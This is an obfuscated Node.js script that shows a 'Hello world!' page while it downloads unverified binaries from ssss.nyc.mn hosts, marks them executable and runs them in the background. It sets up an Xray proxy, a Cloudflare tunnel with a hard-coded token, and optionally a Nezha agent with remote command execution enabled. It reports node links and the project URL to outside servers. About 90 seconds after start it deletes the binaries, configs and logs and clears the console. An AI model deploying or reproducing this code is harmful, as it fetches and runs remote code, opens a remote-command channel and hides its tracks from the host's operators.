function _0x3ef3(){const _0x18d275=['pipe','web\x20is\x20running','none','chmod','utf-8','createWriteStream','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','mkdirSync','has','pop','App\x20is\x20running','https://amd64.ssss.nyc.mn/2go','filter','/vmess-argo?ed=2560','./php','&path=%2Ftrojan-argo%3Fed%3D2560#','block','www.visa.com.sg','/dev/null','./bot','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','PORT','CFPORT','https://arm64.ssss.nyc.mn/agent','npm','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','8XQLIBM','/tunnel.yml\x20run','2782764hTwMJN','127.0.0.1','application/json','tunnel.yml','SERVER_PORT','eyJhIjoiODYyMmRlNmEyYTk3OGJjMjNmMzAxOTZlZWVlNTk4MzgiLCJ0IjoiYzZhMGFhNmItYTIwNC00YjhmLTgxMzItNGJkMThiYjlkNDI4IiwicyI6Ik5EazFNV1JqTjJRdFl6SXhNaTAwWXpVMUxUZ3lOMlV0T1RJMlptWmxabVl3T1RNMyJ9','axios','set','includes','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20>/dev/null\x202>&1\x20&','nohup\x20','1003349PrGppM','352205VNZnve','9afd1229-b893-40c1-84dd-51e7ce204913','Content-Type','forEach','Download\x20','/php\x20-c\x20\x22','\x0a\x20\x20tunnel:\x20','send','finish','NEZHA_SERVER','/api/add-nodes','base64','fileName','Subscription\x20uploaded\x20successfully','NAME','toString','Vls','util','PROJECT_URL','Skipping\x20adding\x20automatic\x20access\x20task','rm\x20-rf\x20','readFileSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','trojan','status','then','8443','https://arm64.ssss.nyc.mn/v1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','443','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/web','amd','添加URL失败:\x20','quic','from','Empowerment\x20failed\x20for\x20','response','unlink','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','&path=%2Fvless-argo%3Fed%3D2560#','/api/delete-nodes','/vless-argo','post','get','writeFileSync','php\x20running\x20error:\x20','aarch64','CFIP','xtls-rprx-vision','tcp','length','SUB_PATH','\x20-p\x20','text/plain;\x20charset=utf-8','?encryption=none&security=tls&sni=','https://oooo.serv00.net/add-url','Error\x20executing\x20command:\x20','2053','child_process','329748CuvLiJ','\x0a\x20\x20credentials-file:\x20','2096','/bot\x20','direct','AUTO_ACCESS','vless','./npm','NEZHA_KEY','/sub.txt\x20saved\x20successfully','\x20failed:\x20','all','sub','stream','?security=tls&sni=','/trojan-argo','\x20is\x20created','arm64','FILE_PATH','/vmess-argo','\x0a\x20\x20\x20\x20','true','log','\x0a\x20\x20\x0atrojan://','join','express','blackhole','listen','npm\x20is\x20running','php\x20is\x20running','10GFxgkN','unlinkSync','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','web','2nAWcmN','https://amd64.ssss.nyc.mn/agent','\x0avless://','http','/web\x20-c\x20','305793hdNAqE','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','UUID','Error\x20downloading\x20files:','3142758Cwpklt','bot','test','./tmp','bot\x20is\x20running','match','tls','unshift','/npm\x20-s\x20','config.json','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Empowerment\x20success\x20for\x20','catch','bot\x20is\x20running.','message','data','Error\x20reading\x20boot.log:','argo.njdaxue.ggff.net','web\x20running\x20error:\x20','false','20LpeYad','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2083','split','boot.log','map','./web','existsSync','ArgoDomain:','arm','freedom','stringify','2087','clear','push','--tls','env','tunnel.json','php','error','sub.txt','list.txt','automatic\x20access\x20task\x20added\x20successfully','5938251ULAkjH','close'];_0x3ef3=function(){return _0x18d275;};return _0x3ef3();}function _0x567a(_0x3c979b,_0x39b8e3){const _0x3ef324=_0x3ef3();return _0x567a=function(_0x567a5e,_0x788f6a){_0x567a5e=_0x567a5e-0x8b;let _0x5be26f=_0x3ef324[_0x567a5e];return _0x5be26f;},_0x567a(_0x3c979b,_0x39b8e3);}const _0x5b4b06=_0x567a;(function(_0x2c9614,_0xca7ed2){const _0xdd2289=_0x567a,_0x472d90=_0x2c9614();while(!![]){try{const _0x25c66c=parseInt(_0xdd2289(0xb0))/0x1+parseInt(_0xdd2289(0x10f))/0x2*(-parseInt(_0xdd2289(0x118))/0x3)+-parseInt(_0xdd2289(0xed))/0x4*(parseInt(_0xdd2289(0x12c))/0x5)+parseInt(_0xdd2289(0xa4))/0x6+-parseInt(_0xdd2289(0xb1))/0x7+parseInt(_0xdd2289(0xa2))/0x8*(-parseInt(_0xdd2289(0x114))/0x9)+parseInt(_0xdd2289(0x10b))/0xa*(parseInt(_0xdd2289(0x143))/0xb);if(_0x25c66c===_0xca7ed2)break;else _0x472d90['push'](_0x472d90['shift']());}catch(_0x2ead7c){_0x472d90['push'](_0x472d90['shift']());}}}(_0x3ef3,0x8524e));const express=require(_0x5b4b06(0x106)),app=express(),axios=require(_0x5b4b06(0xaa)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5b4b06(0xc2)),exec=promisify(require(_0x5b4b06(0xec))['exec']),{execSync}=require(_0x5b4b06(0xec)),UPLOAD_URL=process[_0x5b4b06(0x13c)]['UPLOAD_URL']||'',PROJECT_URL=process['env'][_0x5b4b06(0xc3)]||'',AUTO_ACCESS=process[_0x5b4b06(0x13c)][_0x5b4b06(0xf2)]||![],FILE_PATH=process[_0x5b4b06(0x13c)][_0x5b4b06(0xff)]||_0x5b4b06(0x11b),SUB_PATH=process[_0x5b4b06(0x13c)][_0x5b4b06(0xe5)]||_0x5b4b06(0xf9),PORT=process['env'][_0x5b4b06(0xa8)]||process[_0x5b4b06(0x13c)][_0x5b4b06(0x9d)]||0xbb8,UUID=process[_0x5b4b06(0x13c)][_0x5b4b06(0x116)]||_0x5b4b06(0xb2),NEZHA_SERVER=process[_0x5b4b06(0x13c)][_0x5b4b06(0xba)]||'',NEZHA_PORT=process[_0x5b4b06(0x13c)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5b4b06(0x13c)][_0x5b4b06(0xf5)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x5b4b06(0x129),ARGO_AUTH=process[_0x5b4b06(0x13c)]['ARGO_AUTH']||_0x5b4b06(0xa9),ARGO_PORT=process[_0x5b4b06(0x13c)]['ARGO_PORT']||0x1f41,CFIP=process[_0x5b4b06(0x13c)][_0x5b4b06(0xe1)]||_0x5b4b06(0x99),CFPORT=process[_0x5b4b06(0x13c)][_0x5b4b06(0x9e)]||0x1bb,NAME=process[_0x5b4b06(0x13c)][_0x5b4b06(0xbf)]||_0x5b4b06(0xc1);!fs[_0x5b4b06(0x133)](FILE_PATH)?(fs[_0x5b4b06(0x8f)](FILE_PATH),console[_0x5b4b06(0x103)](FILE_PATH+_0x5b4b06(0xfd))):console[_0x5b4b06(0x103)](FILE_PATH+'\x20already\x20exists');let npmPath=path[_0x5b4b06(0x105)](FILE_PATH,_0x5b4b06(0xa0)),phpPath=path[_0x5b4b06(0x105)](FILE_PATH,_0x5b4b06(0x13e)),webPath=path[_0x5b4b06(0x105)](FILE_PATH,_0x5b4b06(0x10e)),botPath=path[_0x5b4b06(0x105)](FILE_PATH,_0x5b4b06(0x119)),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x5b4b06(0x141)),bootLogPath=path[_0x5b4b06(0x105)](FILE_PATH,'boot.log'),configPath=path[_0x5b4b06(0x105)](FILE_PATH,_0x5b4b06(0x121));function deleteNodes(){const _0xb2c9ee=_0x5b4b06;try{if(!UPLOAD_URL)return;if(!fs[_0xb2c9ee(0x133)](subPath))return;let _0x2827a1;try{_0x2827a1=fs[_0xb2c9ee(0xc6)](subPath,'utf-8');}catch{return null;}const _0x2b7d1f=Buffer['from'](_0x2827a1,_0xb2c9ee(0xbc))[_0xb2c9ee(0xc0)](_0xb2c9ee(0x8c)),_0x2c82f2=_0x2b7d1f[_0xb2c9ee(0x12f)]('\x0a')[_0xb2c9ee(0x94)](_0x119b94=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x119b94));if(_0x2c82f2[_0xb2c9ee(0xe4)]===0x0)return;return axios[_0xb2c9ee(0xdc)](UPLOAD_URL+_0xb2c9ee(0xda),JSON[_0xb2c9ee(0x137)]({'nodes':_0x2c82f2}),{'headers':{'Content-Type':_0xb2c9ee(0xa6)}})[_0xb2c9ee(0x124)](_0x589357=>{return null;});}catch(_0x19fa99){return null;}}function cleanupOldFiles(){const _0x59fc6e=_0x5b4b06,_0x190bb2=[_0x59fc6e(0x10e),_0x59fc6e(0x119),_0x59fc6e(0xa0),_0x59fc6e(0x13e),_0x59fc6e(0x140),'boot.log'];_0x190bb2[_0x59fc6e(0xb4)](_0x59d4ae=>{const _0x374d22=_0x59fc6e,_0x5b4f61=path[_0x374d22(0x105)](FILE_PATH,_0x59d4ae);fs['unlink'](_0x5b4f61,()=>{});});}app['get']('/',function(_0x2afe83,_0x38a06e){const _0x7d8b2f=_0x5b4b06;_0x38a06e[_0x7d8b2f(0xb8)]('Hello\x20world!');});const config={'log':{'access':_0x5b4b06(0x9a),'error':_0x5b4b06(0x9a),'loglevel':_0x5b4b06(0x147)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5b4b06(0xf3),'settings':{'clients':[{'id':UUID,'flow':_0x5b4b06(0xe2)}],'decryption':_0x5b4b06(0x147),'fallbacks':[{'dest':0xbb9},{'path':_0x5b4b06(0xdb),'dest':0xbba},{'path':_0x5b4b06(0x100),'dest':0xbbb},{'path':_0x5b4b06(0xfc),'dest':0xbbc}]},'streamSettings':{'network':_0x5b4b06(0xe3)}},{'port':0xbb9,'listen':_0x5b4b06(0xa5),'protocol':_0x5b4b06(0xf3),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5b4b06(0xe3),'security':'none'}},{'port':0xbba,'listen':_0x5b4b06(0xa5),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x5b4b06(0x147),'wsSettings':{'path':_0x5b4b06(0xdb)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5b4b06(0x11e),_0x5b4b06(0xd3)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5b4b06(0x100)}},'sniffing':{'enabled':!![],'destOverride':[_0x5b4b06(0x112),_0x5b4b06(0x11e),_0x5b4b06(0xd3)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5b4b06(0xa5),'protocol':_0x5b4b06(0xc8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5b4b06(0xfc)}},'sniffing':{'enabled':!![],'destOverride':[_0x5b4b06(0x112),_0x5b4b06(0x11e),_0x5b4b06(0xd3)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x5b4b06(0x136),'tag':_0x5b4b06(0xf1)},{'protocol':_0x5b4b06(0x107),'tag':_0x5b4b06(0x98)}]};fs[_0x5b4b06(0xde)](path[_0x5b4b06(0x105)](FILE_PATH,_0x5b4b06(0x121)),JSON[_0x5b4b06(0x137)](config,null,0x2));function getSystemArchitecture(){const _0x4e216d=_0x5b4b06,_0x30b1f1=os['arch']();return _0x30b1f1===_0x4e216d(0x135)||_0x30b1f1===_0x4e216d(0xfe)||_0x30b1f1===_0x4e216d(0xe0)?'arm':_0x4e216d(0xd1);}function downloadFile(_0x44d71e,_0x53acaf,_0x414401){const _0x30edfb=_0x5b4b06,_0x22e0cd=path[_0x30edfb(0x105)](FILE_PATH,_0x44d71e),_0xe6adab=fs[_0x30edfb(0x8d)](_0x22e0cd);axios({'method':_0x30edfb(0xdd),'url':_0x53acaf,'responseType':_0x30edfb(0xfa)})[_0x30edfb(0xca)](_0x3d7a19=>{const _0x638e1c=_0x30edfb;_0x3d7a19[_0x638e1c(0x127)][_0x638e1c(0x145)](_0xe6adab),_0xe6adab['on'](_0x638e1c(0xb9),()=>{const _0x396d8b=_0x638e1c;_0xe6adab[_0x396d8b(0x144)](),console[_0x396d8b(0x103)](_0x396d8b(0xb5)+_0x44d71e+'\x20successfully'),_0x414401(null,_0x44d71e);}),_0xe6adab['on'](_0x638e1c(0x13f),_0x41c4ce=>{const _0x313107=_0x638e1c;fs[_0x313107(0xd7)](_0x22e0cd,()=>{});const _0x2e0ae8=_0x313107(0xb5)+_0x44d71e+_0x313107(0xf7)+_0x41c4ce[_0x313107(0x126)];console[_0x313107(0x13f)](_0x2e0ae8),_0x414401(_0x2e0ae8);});})[_0x30edfb(0x124)](_0x56467d=>{const _0x23cbfb=_0x30edfb,_0x579f8c='Download\x20'+_0x44d71e+'\x20failed:\x20'+_0x56467d[_0x23cbfb(0x126)];console['error'](_0x579f8c),_0x414401(_0x579f8c);});}async function downloadFilesAndRun(){const _0x284866=_0x5b4b06,_0x160a73=getSystemArchitecture(),_0x1c4fa5=getFilesForArchitecture(_0x160a73);if(_0x1c4fa5[_0x284866(0xe4)]===0x0){console[_0x284866(0x103)](_0x284866(0x12d));return;}const _0x2a931c=_0x1c4fa5[_0x284866(0x131)](_0x286e90=>{return new Promise((_0x384e55,_0x14c229)=>{const _0x410303=_0x567a;downloadFile(_0x286e90[_0x410303(0xbd)],_0x286e90['fileUrl'],(_0x1ced0d,_0xf85a6d)=>{_0x1ced0d?_0x14c229(_0x1ced0d):_0x384e55(_0xf85a6d);});});});try{await Promise[_0x284866(0xf8)](_0x2a931c);}catch(_0x336f7e){console[_0x284866(0x13f)](_0x284866(0x117),_0x336f7e);return;}function _0x722de1(_0x136e3e){const _0x5d59ae=_0x284866,_0x133cdf=0x1fd;_0x136e3e[_0x5d59ae(0xb4)](_0x619451=>{const _0xe1adcc=_0x5d59ae,_0x176820=path['join'](FILE_PATH,_0x619451);fs[_0xe1adcc(0x133)](_0x176820)&&fs[_0xe1adcc(0x8b)](_0x176820,_0x133cdf,_0x2b97b2=>{const _0x1f7a5d=_0xe1adcc;_0x2b97b2?console['error'](_0x1f7a5d(0xd5)+_0x176820+':\x20'+_0x2b97b2):console[_0x1f7a5d(0x103)](_0x1f7a5d(0x123)+_0x176820+':\x20'+_0x133cdf['toString'](0x8));});});}const _0x5124be=NEZHA_PORT?[_0x284866(0xf4),_0x284866(0x132),_0x284866(0x9b)]:[_0x284866(0x96),_0x284866(0x132),'./bot'];_0x722de1(_0x5124be);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x30626b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x284866(0x91)]():'',_0x31bdf9=new Set([_0x284866(0xce),'8443',_0x284866(0xef),'2087','2083',_0x284866(0xeb)]),_0x17c819=_0x31bdf9[_0x284866(0x90)](_0x30626b)?_0x284866(0x102):_0x284866(0x12b),_0x6191ab='\x0aclient_secret:\x20'+NEZHA_KEY+_0x284866(0x9c)+NEZHA_SERVER+_0x284866(0x8e)+_0x17c819+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x284866(0xde)](path[_0x284866(0x105)](FILE_PATH,'config.yaml'),_0x6191ab);const _0x35580b=_0x284866(0xaf)+FILE_PATH+_0x284866(0xb6)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x35580b),console[_0x284866(0x103)](_0x284866(0x10a)),await new Promise(_0x385359=>setTimeout(_0x385359,0x3e8));}catch(_0x40e27d){console[_0x284866(0x13f)](_0x284866(0xdf)+_0x40e27d);}}else{let _0x4c38dc='';const _0x5344d4=[_0x284866(0xce),_0x284866(0xcb),_0x284866(0xef),_0x284866(0x138),_0x284866(0x12e),_0x284866(0xeb)];_0x5344d4['includes'](NEZHA_PORT)&&(_0x4c38dc=_0x284866(0x13b));const _0x5e99e0=_0x284866(0xaf)+FILE_PATH+_0x284866(0x120)+NEZHA_SERVER+':'+NEZHA_PORT+_0x284866(0xe6)+NEZHA_KEY+'\x20'+_0x4c38dc+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5e99e0),console[_0x284866(0x103)](_0x284866(0x109)),await new Promise(_0x638056=>setTimeout(_0x638056,0x3e8));}catch(_0x204732){console[_0x284866(0x13f)]('npm\x20running\x20error:\x20'+_0x204732);}}}else console[_0x284866(0x103)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4c2e33=_0x284866(0xaf)+FILE_PATH+_0x284866(0x113)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4c2e33),console[_0x284866(0x103)](_0x284866(0x146)),await new Promise(_0x245d4b=>setTimeout(_0x245d4b,0x3e8));}catch(_0x25f30f){console[_0x284866(0x13f)](_0x284866(0x12a)+_0x25f30f);}if(fs[_0x284866(0x133)](path[_0x284866(0x105)](FILE_PATH,_0x284866(0x119)))){let _0x54687e;if(ARGO_AUTH[_0x284866(0x11d)](/^[A-Z0-9a-z=]{120,250}$/))_0x54687e=_0x284866(0xc7)+ARGO_AUTH;else ARGO_AUTH[_0x284866(0x11d)](/TunnelSecret/)?_0x54687e=_0x284866(0xd8)+FILE_PATH+_0x284866(0xa3):_0x54687e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x284866(0xcd)+ARGO_PORT;try{await exec(_0x284866(0xaf)+FILE_PATH+_0x284866(0xf0)+_0x54687e+_0x284866(0xae)),console[_0x284866(0x103)](_0x284866(0x11c)),await new Promise(_0x267fdb=>setTimeout(_0x267fdb,0x7d0));}catch(_0x4bfc52){console[_0x284866(0x13f)](_0x284866(0xea)+_0x4bfc52);}}await new Promise(_0x223f28=>setTimeout(_0x223f28,0x1388));}function getFilesForArchitecture(_0x305be0){const _0x23bf11=_0x5b4b06;let _0x360b8b;_0x305be0===_0x23bf11(0x135)?_0x360b8b=[{'fileName':_0x23bf11(0x10e),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x23bf11(0x119),'fileUrl':'https://arm64.ssss.nyc.mn/2go'}]:_0x360b8b=[{'fileName':_0x23bf11(0x10e),'fileUrl':_0x23bf11(0xd0)},{'fileName':'bot','fileUrl':_0x23bf11(0x93)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2f23b8=_0x305be0===_0x23bf11(0x135)?_0x23bf11(0x9f):_0x23bf11(0x110);_0x360b8b[_0x23bf11(0x11f)]({'fileName':'npm','fileUrl':_0x2f23b8});}else{const _0x5ba143=_0x305be0==='arm'?_0x23bf11(0xcc):'https://amd64.ssss.nyc.mn/v1';_0x360b8b[_0x23bf11(0x11f)]({'fileName':_0x23bf11(0x13e),'fileUrl':_0x5ba143});}}return _0x360b8b;}function argoType(){const _0x1daf2b=_0x5b4b06;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1daf2b(0x103)](_0x1daf2b(0xad));return;}if(ARGO_AUTH[_0x1daf2b(0xac)]('TunnelSecret')){fs['writeFileSync'](path[_0x1daf2b(0x105)](FILE_PATH,_0x1daf2b(0x13d)),ARGO_AUTH);const _0x32f387=_0x1daf2b(0xb7)+ARGO_AUTH[_0x1daf2b(0x12f)]('\x22')[0xb]+_0x1daf2b(0xee)+path[_0x1daf2b(0x105)](FILE_PATH,'tunnel.json')+_0x1daf2b(0xcf)+ARGO_DOMAIN+_0x1daf2b(0x115)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x1daf2b(0xde)](path[_0x1daf2b(0x105)](FILE_PATH,_0x1daf2b(0xa7)),_0x32f387);}else console[_0x1daf2b(0x103)](_0x1daf2b(0x122));}argoType();async function extractDomains(){const _0xc69682=_0x5b4b06;let _0x271f0f;if(ARGO_AUTH&&ARGO_DOMAIN)_0x271f0f=ARGO_DOMAIN,console[_0xc69682(0x103)]('ARGO_DOMAIN:',_0x271f0f),await _0x346dfc(_0x271f0f);else try{const _0x42c15c=fs[_0xc69682(0xc6)](path[_0xc69682(0x105)](FILE_PATH,_0xc69682(0x130)),_0xc69682(0x8c)),_0x394982=_0x42c15c[_0xc69682(0x12f)]('\x0a'),_0x5b7106=[];_0x394982[_0xc69682(0xb4)](_0xe8fd39=>{const _0x531230=_0xc69682,_0x1dc65a=_0xe8fd39['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1dc65a){const _0x5827a7=_0x1dc65a[0x1];_0x5b7106[_0x531230(0x13a)](_0x5827a7);}});if(_0x5b7106[_0xc69682(0xe4)]>0x0)_0x271f0f=_0x5b7106[0x0],console[_0xc69682(0x103)](_0xc69682(0x134),_0x271f0f),await _0x346dfc(_0x271f0f);else{console[_0xc69682(0x103)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0xc69682(0x10c)](path[_0xc69682(0x105)](FILE_PATH,_0xc69682(0x130)));async function _0x3ae60b(){const _0x2746ce=_0xc69682;try{await exec(_0x2746ce(0xa1));}catch(_0x2b3d50){}}_0x3ae60b(),await new Promise(_0x3997fb=>setTimeout(_0x3997fb,0xbb8));const _0x3abbea='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xc69682(0xaf)+path[_0xc69682(0x105)](FILE_PATH,_0xc69682(0x119))+'\x20'+_0x3abbea+_0xc69682(0xae)),console[_0xc69682(0x103)](_0xc69682(0x125)),await new Promise(_0x1723da=>setTimeout(_0x1723da,0xbb8)),await extractDomains();}catch(_0x5e3661){console[_0xc69682(0x13f)](_0xc69682(0xea)+_0x5e3661);}}}catch(_0x23c183){console['error'](_0xc69682(0x128),_0x23c183);}async function _0x346dfc(_0x51f816){const _0x4ec697=_0xc69682,_0x5112a4=execSync(_0x4ec697(0x10d),{'encoding':_0x4ec697(0x8c)}),_0x55813e=_0x5112a4['trim']();return new Promise(_0x2c40f5=>{setTimeout(()=>{const _0x5236e0=_0x567a,_0xc61e40={'v':'2','ps':NAME+'-'+_0x55813e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5236e0(0x147),'net':'ws','type':_0x5236e0(0x147),'host':_0x51f816,'path':_0x5236e0(0x95),'tls':_0x5236e0(0x11e),'sni':_0x51f816,'alpn':''},_0x43dd47=_0x5236e0(0x111)+UUID+'@'+CFIP+':'+CFPORT+_0x5236e0(0xe8)+_0x51f816+'&type=ws&host='+_0x51f816+_0x5236e0(0xd9)+NAME+'-'+_0x55813e+'\x0a\x20\x20\x0avmess://'+Buffer[_0x5236e0(0xd4)](JSON[_0x5236e0(0x137)](_0xc61e40))[_0x5236e0(0xc0)]('base64')+_0x5236e0(0x104)+UUID+'@'+CFIP+':'+CFPORT+_0x5236e0(0xfb)+_0x51f816+'&type=ws&host='+_0x51f816+_0x5236e0(0x97)+NAME+'-'+_0x55813e+_0x5236e0(0x101);console['log'](Buffer[_0x5236e0(0xd4)](_0x43dd47)[_0x5236e0(0xc0)](_0x5236e0(0xbc))),fs[_0x5236e0(0xde)](subPath,Buffer['from'](_0x43dd47)[_0x5236e0(0xc0)]('base64')),console[_0x5236e0(0x103)](FILE_PATH+_0x5236e0(0xf6)),uplodNodes(),app[_0x5236e0(0xdd)]('/'+SUB_PATH,(_0x2cebba,_0x6978e9)=>{const _0x5b79c2=_0x5236e0,_0x2e27b9=Buffer[_0x5b79c2(0xd4)](_0x43dd47)['toString'](_0x5b79c2(0xbc));_0x6978e9[_0x5b79c2(0xab)](_0x5b79c2(0xb3),_0x5b79c2(0xe7)),_0x6978e9[_0x5b79c2(0xb8)](_0x2e27b9);}),_0x2c40f5(_0x43dd47);},0x7d0);});}}async function uplodNodes(){const _0x170cd4=_0x5b4b06;if(UPLOAD_URL&&PROJECT_URL){const _0x860160=PROJECT_URL+'/'+SUB_PATH,_0x3e4c68={'subscription':[_0x860160]};try{const _0x5b1a80=await axios[_0x170cd4(0xdc)](UPLOAD_URL+'/api/add-subscriptions',_0x3e4c68,{'headers':{'Content-Type':'application/json'}});if(_0x5b1a80[_0x170cd4(0xc9)]===0xc8)console[_0x170cd4(0x103)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x278483){if(_0x278483['response']){if(_0x278483[_0x170cd4(0xd6)][_0x170cd4(0xc9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x451716=fs['readFileSync'](listPath,_0x170cd4(0x8c)),_0x1a24fb=_0x451716[_0x170cd4(0x12f)]('\x0a')[_0x170cd4(0x94)](_0x5345bf=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x170cd4(0x11a)](_0x5345bf));if(_0x1a24fb[_0x170cd4(0xe4)]===0x0)return;const _0x9c1e7e=JSON[_0x170cd4(0x137)]({'nodes':_0x1a24fb});try{await axios[_0x170cd4(0xdc)](UPLOAD_URL+_0x170cd4(0xbb),_0x9c1e7e,{'headers':{'Content-Type':'application/json'}});if(response[_0x170cd4(0xc9)]===0xc8)console[_0x170cd4(0x103)](_0x170cd4(0xbe));else return null;}catch(_0x4974b0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x933290=_0x567a,_0x552051=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x552051[_0x933290(0x13a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x552051[_0x933290(0x13a)](phpPath);exec(_0x933290(0xc5)+_0x552051['join']('\x20')+'\x20>/dev/null\x202>&1',_0x6fb0b9=>{const _0x5c4e3f=_0x933290;console[_0x5c4e3f(0x139)](),console[_0x5c4e3f(0x103)](_0x5c4e3f(0x92)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3352d8=_0x5b4b06;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x3352d8(0xc4));return;}try{const _0x2215f4=await axios[_0x3352d8(0xdc)](_0x3352d8(0xe9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3352d8(0xa6)}});console[_0x3352d8(0x103)](_0x3352d8(0x142));}catch(_0x29db9a){console['error'](_0x3352d8(0xd2)+_0x29db9a[_0x3352d8(0x126)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x5b4b06(0x108)](PORT,()=>console[_0x5b4b06(0x103)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
